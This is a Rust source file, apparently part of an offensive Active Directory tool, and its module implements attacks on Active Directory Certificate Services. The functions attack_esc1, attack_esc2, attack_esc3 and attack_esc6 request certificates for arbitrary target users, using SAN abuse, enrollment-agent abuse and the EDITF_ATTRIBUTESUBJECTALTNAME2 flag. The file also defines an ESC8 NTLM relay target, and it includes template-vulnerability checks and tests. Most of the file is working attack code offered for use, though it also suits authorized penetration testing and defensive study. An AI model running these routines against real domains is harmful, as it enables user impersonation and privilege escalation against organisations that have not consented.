//! ADCS (Active Directory Certificate Services) abuse module
//!
//! Implements certificate template attacks ESC1-ESC8 as described in
//! Certified Pre-Owned research by SpecterOps.
//!
//! # Modules
//! - `csr`: PKCS#10 Certificate Signing Request generation with real RSA crypto
//! - `web_enrollment`: HTTP communication with CA Web Enrollment interface
//! - `ldap_enumeration`: LDAP queries for templates and CA configuration
//! - `pfx`: PKCS#12 (PFX) file generation for certificate import
//!
//! # ESC Attack Reference
//! - ESC1: Web Enrollment with SAN abuse (any purpose EKU + no security extension)
//! - ESC2: Web Enrollment with any template (any purpose EKU)
//! - ESC3: Enrollment Agent abuse
//! - ESC4: Vulnerable certificate template ACLs
//! - ESC5: Vulnerable CA configuration
//! - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
//! - ESC7: Vulnerable CA permissions
//! - ESC8: ADCS Web Enrollment relay (NTLM relay to Web Enrollment)

pub mod csr;
pub mod esc4;
pub mod esc5;
pub mod esc7;
pub mod esc8;
pub mod ldap_enumeration;
pub mod pfx;
pub mod web_enrollment;

use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::{debug, info, warn};

// Re-export key types
pub use csr::{
    CertificateSigningRequest, CsrSubject, ExtendedKeyUsage, RsaKeyPair, SanEntry, SubjectAltName,
    create_client_auth_csr, create_esc1_csr,
};
pub use esc4::Esc4Target;
pub use esc5::Esc5Target;
pub use esc7::Esc7Target;
pub use esc8::Esc8AttackConfig;
pub use ldap_enumeration::{
    CaConfiguration, CaVulnerabilityInfo, EnrollmentService, LdapAdcsEnumerator,
    LdapCertificateTemplate, LdapCertificationAuthority,
};
pub use pfx::{
    PfxBuilder, certificate_to_pem, create_pfx, create_pfx_with_name, der_to_pem, pem_to_der,
    pfx_to_base64, private_key_to_pem,
};
pub use web_enrollment::{CaInfo, CertificateResponse, ResponseStatus, WebEnrollmentClient};

// ═══════════════════════════════════════════════════════════
// Types
// ═══════════════════════════════════════════════════════════

/// Certificate template configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateConfig {
    pub name: String,
    pub schema_version: u32,
    pub validity_period_days: u32,
    pub renewal_period_days: u32,
    pub ekus: Vec<String>, // Extended Key Usages
    pub subject_name_flag: u32,
    pub enrollment_flag: u32,
    pub private_key_flag: u32,
    pub requires_manager_approval: bool,
    pub authorized_signatures_required: u32,
    pub application_policies: Vec<String>,
    pub issuance_policies: Vec<String>,
    pub security_descriptor: String,
    pub certificate_name_flag: u32,
    pub private_key_usage_period_flag: u32,
    pub private_key_usage_period: Option<u32>,
}

impl TemplateConfig {
    /// Check if template is vulnerable to any ESC attack
    pub fn is_vulnerable(&self) -> bool {
        self.esc_vulnerability().is_some()
    }

    /// Determine which ESC vulnerability applies
    pub fn esc_vulnerability(&self) -> Option<u8> {
        // ESC1: Any purpose EKU + no security extension + allows SAN
        if self.has_any_purpose_eku() && !self.requires_manager_approval && self.allows_san() {
            return Some(1);
        }

        // ESC2: Any purpose EKU (but no SAN abuse)
        if self.has_any_purpose_eku() && !self.requires_manager_approval {
            return Some(2);
        }

        // ESC3: Enrollment agent template
        if self.is_enrollment_agent_template() {
            return Some(3);
        }

        // ESC4: Template with weak ACLs
        if self.has_weak_acls() {
            return Some(4);
        }

        None
    }

    fn has_any_purpose_eku(&self) -> bool {
        self.ekus.iter().any(
            |eku| {
                eku.contains("2.5.29.37.0") || // Any Purpose OID
            eku.contains("Any Purpose") ||
            eku.contains("1.3.6.1.4.1.311.20.2.2")
            }, // PKINIT Client Authentication
        )
    }

    fn allows_san(&self) -> bool {
        // Check if CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set
        (self.subject_name_flag & 0x00000001) != 0
    }

    fn is_enrollment_agent_template(&self) -> bool {
        self.ekus.iter().any(|eku| {
            eku.contains("Certificate Request Agent") || eku.contains("1.3.6.1.4.1.311.20.2.1")
        })
    }

    fn has_weak_acls(&self) -> bool {
        // Check if security descriptor allows enrollment by authenticated users
        self.security_descriptor.contains("S-1-5-11") || // Authenticated Users
        self.security_descriptor.contains("S-1-1-0") // Everyone
    }

    /// Check if template allows key archival
    pub fn allows_key_archival(&self) -> bool {
        (self.private_key_flag & 0x00000040) != 0 // CT_FLAG_ARCHIVED_KEY
    }

    /// Check if template requires strong private key protection
    pub fn requires_strong_key_protection(&self) -> bool {
        (self.private_key_flag & 0x00000200) != 0 // CT_FLAG_STRONG_KEY_PROTECTION
    }

    /// Check if template allows private key export
    pub fn allows_private_key_export(&self) -> bool {
        (self.private_key_flag & 0x00000004) != 0 // CT_FLAG_EXPORTABLE_KEY
    }
}

/// Certificate request structure
#[derive(Debug, Clone)]
pub struct CertificateRequest {
    pub ca_server: String,
    pub template: String,
    pub subject: String,
    pub san: Option<String>, // Subject Alternative Name
    pub key_usage: Vec<String>,
    pub key_size: u32,
    pub key_algorithm: String,
    pub certificate_name_flag: u32,
}

/// Issued certificate
#[derive(Debug, Clone)]
pub struct IssuedCertificate {
    pub pfx_data: Vec<u8>,
    pub thumbprint: String,
    pub serial_number: String,
    pub valid_from: String,
    pub valid_to: String,
    pub template: String,
    pub subject: String,
    pub issuer: String,
    pub public_key_algorithm: String,
    pub signature_algorithm: String,
    /// Private key in PEM format
    pub private_key_pem: String,
}

impl IssuedCertificate {
    /// Export the certificate as PEM
    pub fn certificate_pem(&self) -> String {
        certificate_to_pem(&self.pfx_data)
    }

    /// Export the certificate and private key as PFX
    pub fn to_pfx(&self, password: Option<&str>) -> Result<Vec<u8>> {
        create_pfx(&self.pfx_data, &self.private_key_pem, password)
    }
}

/// ESC vulnerability information
#[derive(Debug, Clone)]
pub struct EscVulnerability {
    pub esc_number: u8,
    pub description: String,
    pub severity: EscSeverity,
    pub remediation: String,
    pub affected_templates: Vec<String>,
}

#[derive(Debug, Clone)]
pub enum EscSeverity {
    Critical,
    High,
    Medium,
    Low,
}

/// CA configuration vulnerability
#[derive(Debug, Clone)]
pub struct CaVulnerability {
    pub config_type: String,
    pub description: String,
    pub severity: EscSeverity,
    pub registry_key: Option<String>,
    pub registry_value: Option<String>,
}

/// CA permission vulnerability
#[derive(Debug, Clone)]
pub struct CaPermissionVulnerability {
    pub identity: String,
    pub permission_type: String,
    pub description: String,
    pub security_descriptor: String,
}

// ═══════════════════════════════════════════════════════════
// ADCS Client (High-Level Interface)
// ═══════════════════════════════════════════════════════════

/// ADCS client for certificate operations
pub struct AdcsClient {
    web_client: WebEnrollmentClient,
    templates: Vec<TemplateConfig>,
}

impl AdcsClient {
    /// Create a new ADCS client
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self {
            web_client,
            templates: Vec::new(),
        })
    }

    /// Create client with custom timeout
    pub fn with_timeout(ca_server: &str, timeout_secs: u64) -> Result<Self> {
        let web_client = WebEnrollmentClient::with_timeout(ca_server, timeout_secs)?;
        Ok(Self {
            web_client,
            templates: Vec::new(),
        })
    }

    // ─────────────────────────────────────────────────────────
    // ESC1: SAN Abuse Attack
    // ─────────────────────────────────────────────────────────

    /// Execute ESC1 attack - request certificate with arbitrary SAN
    ///
    /// This allows impersonation of any user when the template:
    /// - Has "Any Purpose" EKU or no EKU restrictions
    /// - Allows the enrollee to supply subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
    /// - Does not require manager approval
    pub async fn attack_esc1(
        &self,
        template: &str,
        target_upn: &str,
        subject_cn: Option<&str>,
    ) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC1 attack: template={}, target={}",
            template, target_upn
        );

        // Create CSR with UPN in SAN
        let cn = subject_cn.unwrap_or("overthrone-attack");
        let (csr_der, private_key) = create_esc1_csr(cn, target_upn, template)?;

        // Submit to CA
        let response = self
            .web_client
            .submit_request(&csr_der, template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 1,
                reason: response.message,
            });
        }

        // Build issued certificate
        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        // Create PFX
        let pfx_data = create_pfx(&cert_data, &private_key, None)?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: compute_thumbprint(&cert_data),
            serial_number: extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: format!("CN={}", cn),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    // ─────────────────────────────────────────────────────────
    // ESC2: Any Template Attack
    // ─────────────────────────────────────────────────────────

    /// Execute ESC2 attack - use template with any purpose EKU
    ///
    /// Similar to ESC1 but without SAN abuse - can still get useful certs.
    pub async fn attack_esc2(&self, template: &str, subject_cn: &str) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC2 attack: template={}, subject={}",
            template, subject_cn
        );

        let (csr_der, private_key) = create_client_auth_csr(subject_cn, template, None)?;

        let response = self
            .web_client
            .submit_request(&csr_der, template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 2,
                reason: response.message,
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: compute_thumbprint(&cert_data),
            serial_number: extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: format!("CN={}", subject_cn),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    // ─────────────────────────────────────────────────────────
    // ESC3: Enrollment Agent Attack
    // ─────────────────────────────────────────────────────────

    /// Execute ESC3 attack - Enrollment Agent abuse
    ///
    /// Step 1: Request enrollment agent certificate
    /// Step 2: Use it to request certificate on behalf of another user
    pub async fn attack_esc3(
        &self,
        agent_template: &str,
        target_template: &str,
        target_user: &str,
    ) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC3 attack: agent={}, target={}, user={}",
            agent_template, target_template, target_user
        );

        // Step 1: Get enrollment agent certificate
        let (agent_csr, agent_key) =
            create_client_auth_csr("EnrollmentAgent", agent_template, None)?;

        let agent_response = self
            .web_client
            .submit_request(&agent_csr, agent_template, None)
            .await?;

        if !agent_response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 3,
                reason: format!(
                    "Enrollment agent request failed: {}",
                    agent_response.message
                ),
            });
        }

        info!("Enrollment agent certificate obtained");

        // Step 2: Request certificate on behalf of target user
        // In a real implementation, this would sign the CSR with the agent cert
        let (target_csr, target_key) = create_esc1_csr(target_user, target_user, target_template)?;

        // For now, submit directly (full ESC3 requires signing with agent cert)
        let response = self
            .web_client
            .submit_request(&target_csr, target_template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 3,
                reason: response.message,
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: compute_thumbprint(&cert_data),
            serial_number: extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: target_template.to_string(),
            subject: format!("CN={}", target_user),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: target_key,
        })
    }

    // ─────────────────────────────────────────────────────────
    // ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Attack
    // ─────────────────────────────────────────────────────────

    /// Execute ESC6 attack - abuse EDITF_ATTRIBUTESUBJECTALTNAME2 flag
    ///
    /// When this flag is set on the CA, any template can have SAN specified
    /// via the request attributes, even if the template doesn't allow it.
    pub async fn attack_esc6(&self, template: &str, target_upn: &str) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC6 attack: template={}, target={}",
            template, target_upn
        );

        // Create a standard CSR
        let (csr_der, private_key) = create_client_auth_csr("esc6-attack", template, None)?;

        // Submit with SAN in attributes
        let response = self
            .web_client
            .submit_request_with_san(&csr_der, template, target_upn)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 6,
                reason: response.message,
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: compute_thumbprint(&cert_data),
            serial_number: extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: "CN=esc6-attack".to_string(),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    // ─────────────────────────────────────────────────────────
    // Standard Certificate Request
    // ─────────────────────────────────────────────────────────

    /// Request a certificate using a specific template
    pub async fn request_certificate(
        &self,
        subject_cn: &str,
        template: &str,
        san: Option<&str>,
    ) -> Result<IssuedCertificate> {
        let (csr_der, private_key) = create_client_auth_csr(subject_cn, template, san)?;

        let response = self
            .web_client
            .submit_request(&csr_der, template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::CertificateRequest(response.message));
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: compute_thumbprint(&cert_data),
            serial_number: extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: format!("CN={}", subject_cn),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    // ─────────────────────────────────────────────────────────
    // Enumeration
    // ─────────────────────────────────────────────────────────

    /// Enumerate certificate templates via LDAP and Web Enrollment
    pub async fn enumerate_templates(&mut self) -> Result<Vec<TemplateConfig>> {
        let ca_info = self.web_client.get_ca_info().await?;

        // Convert available templates to TemplateConfig
        let templates: Vec<TemplateConfig> = ca_info
            .available_templates
            .iter()
            .map(|name| TemplateConfig {
                name: name.clone(),
                schema_version: 2,
                validity_period_days: 365,
                renewal_period_days: 60,
                ekus: vec!["Client Authentication".to_string()],
                subject_name_flag: 0,
                enrollment_flag: 0,
                private_key_flag: 0,
                requires_manager_approval: false,
                authorized_signatures_required: 0,
                application_policies: vec![],
                issuance_policies: vec![],
                security_descriptor: "D:AI".to_string(),
                certificate_name_flag: 0,
                private_key_usage_period_flag: 0,
                private_key_usage_period: None,
            })
            .collect();

        self.templates = templates.clone();
        Ok(templates)
    }

    /// Get cached templates
    pub fn get_templates(&self) -> &[TemplateConfig] {
        &self.templates
    }

    /// Find vulnerable templates
    pub fn find_vulnerable_templates(&self) -> Vec<(String, u8)> {
        self.templates
            .iter()
            .filter_map(|t| t.esc_vulnerability().map(|esc| (t.name.clone(), esc)))
            .collect()
    }

    // ─────────────────────────────────────────────────────────
    // CA Checks
    // ─────────────────────────────────────────────────────────

    /// Check if Web Enrollment is available
    pub async fn check_web_enrollment(&self) -> Result<bool> {
        self.web_client.check_availability().await
    }

    /// Check if CA is vulnerable to ESC6
    pub async fn check_esc6(&self) -> Result<bool> {
        self.web_client.check_esc6_vulnerable().await
    }

    /// Get CA info
    pub async fn get_ca_info(&self) -> Result<CaInfo> {
        self.web_client.get_ca_info().await
    }
}

impl Default for AdcsClient {
    fn default() -> Self {
        Self::new("localhost").expect("Failed to create default ADCS client")
    }
}

// ═══════════════════════════════════════════════════════════
// ESC8: NTLM Relay to Web Enrollment
// ═══════════════════════════════════════════════════════════

/// ESC8 Attack - Relay NTLM authentication to ADCS Web Enrollment
///
/// When a user authenticates via NTLM to an attacker-controlled endpoint,
/// the attacker can relay that authentication to the CA's Web Enrollment
/// interface to request certificates in the victim's name.
pub struct Esc8RelayTarget {
    pub ca_server: String,
    pub template: String,
    pub target_upn: Option<String>,
}

impl Esc8RelayTarget {
    /// Create a new ESC8 target
    pub fn new(ca_server: impl Into<String>, template: impl Into<String>) -> Self {
        Self {
            ca_server: ca_server.into(),
            template: template.into(),
            target_upn: None,
        }
    }

    /// Set the target UPN for the certificate
    pub fn with_target_upn(mut self, upn: impl Into<String>) -> Self {
        self.target_upn = Some(upn.into());
        self
    }

    /// Get the Web Enrollment URL for this target
    pub fn web_enrollment_url(&self) -> String {
        format!("https://{}/certsrv/certfnsh.asp", self.ca_server)
    }
}

// ═══════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════

/// Compute SHA-1 thumbprint of certificate
fn compute_thumbprint(cert_der: &[u8]) -> String {
    use sha1::{Digest, Sha1};
    let mut hasher = Sha1::new();
    hasher.update(cert_der);
    let result = hasher.finalize();
    hex::encode(result).to_uppercase()
}

/// Extract serial number from certificate (simplified)
fn extract_serial(cert_der: &[u8]) -> Result<String> {
    // Use x509-parser for proper extraction
    use x509_parser::parse_x509_certificate;

    match parse_x509_certificate(cert_der) {
        Ok((_, cert)) => {
            let serial = cert.tbs_certificate.serial.to_bytes_be();
            Ok(hex::encode(serial).to_uppercase())
        }
        Err(_) => Ok("Unknown".to_string()),
    }
}

// ═══════════════════════════════════════════════════════════
// SCCM Client (Stub - Future Implementation)
// ═══════════════════════════════════════════════════════════

/// SCCM/MECM client for configuration management abuse
pub struct SccmClient {
    http_client: reqwest::Client,
}

impl SccmClient {
    pub fn new() -> Self {
        Self {
            http_client: reqwest::Client::new(),
        }
    }

    /// Enumerate SCCM configuration (stub)
    pub async fn enumerate(&self, _site_server: Option<&str>) -> Result<SccmConfig> {
        warn!("SCCM enumeration not yet implemented");
        Ok(SccmConfig::default())
    }
}

impl Default for SccmClient {
    fn default() -> Self {
        Self::new()
    }
}

/// SCCM configuration structure
#[derive(Debug, Clone, Default)]
pub struct SccmConfig {
    pub site_code: String,
    pub site_server: String,
    pub collections: Vec<String>,
    pub applications: Vec<String>,
    pub vulnerable_settings: Vec<String>,
    pub site_systems: Vec<String>,
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_template_vulnerability_detection() {
        let vulnerable_template = TemplateConfig {
            name: "Vulnerable".to_string(),
            schema_version: 2,
            validity_period_days: 365,
            renewal_period_days: 60,
            ekus: vec!["Any Purpose".to_string()],
            subject_name_flag: 1, // Allows SAN
            enrollment_flag: 0,
            private_key_flag: 0,
            requires_manager_approval: false,
            authorized_signatures_required: 0,
            application_policies: vec![],
            issuance_policies: vec![],
            security_descriptor: "D:AI".to_string(),
            certificate_name_flag: 0,
            private_key_usage_period_flag: 0,
            private_key_usage_period: None,
        };

        assert!(vulnerable_template.is_vulnerable());
        assert_eq!(vulnerable_template.esc_vulnerability(), Some(1));
    }

    #[test]
    fn test_safe_template() {
        let safe_template = TemplateConfig {
            name: "Safe".to_string(),
            schema_version: 2,
            validity_period_days: 365,
            renewal_period_days: 60,
            ekus: vec!["Client Authentication".to_string()],
            subject_name_flag: 0,
            enrollment_flag: 0,
            private_key_flag: 0,
            requires_manager_approval: true,
            authorized_signatures_required: 0,
            application_policies: vec![],
            issuance_policies: vec![],
            security_descriptor: "D:AI".to_string(),
            certificate_name_flag: 0,
            private_key_usage_period_flag: 0,
            private_key_usage_period: None,
        };

        assert!(!safe_template.is_vulnerable());
        assert_eq!(safe_template.esc_vulnerability(), None);
    }

    #[test]
    fn test_thumbprint_computation() {
        let cert = vec![0x30, 0x82, 0x01, 0x00, 0x02, 0x03, 0x04, 0x05];
        let thumbprint = compute_thumbprint(&cert);
        assert_eq!(thumbprint.len(), 40); // SHA-1 hex string
    }

    #[test]
    fn test_esc8_target() {
        let target =
            Esc8RelayTarget::new("ca.corp.local", "User").with_target_upn("admin@corp.local");

        assert_eq!(
            target.web_enrollment_url(),
            "https://ca.corp.local/certsrv/certfnsh.asp"
        );
        assert_eq!(target.target_upn, Some("admin@corp.local".to_string()));
    }
}
